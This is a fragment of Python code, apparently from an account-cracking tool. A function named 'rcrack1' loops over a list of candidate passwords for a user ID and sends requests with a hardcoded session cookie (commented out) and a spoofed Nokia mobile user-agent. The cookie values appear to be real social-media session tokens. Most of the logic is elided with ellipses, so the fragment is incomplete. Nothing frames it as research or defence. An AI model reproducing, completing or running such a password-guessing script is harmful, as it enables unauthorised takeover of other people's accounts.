...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
           ...
           # 'cookie': 'datr=g56tZLb2o22s7uFP7APQ_k4t; sb=g56tZIYd_SmjONZwWYrAT687; m_pixel_ratio=1.5; wd=1263x569; fr=0G7JPv3rV8z5hhjUz..BkrZ6D.sO.AAA.0.0.BkrZ6N.AWX-RfuMv78',
            ...
            'user-agent': 'Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaX7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba',}
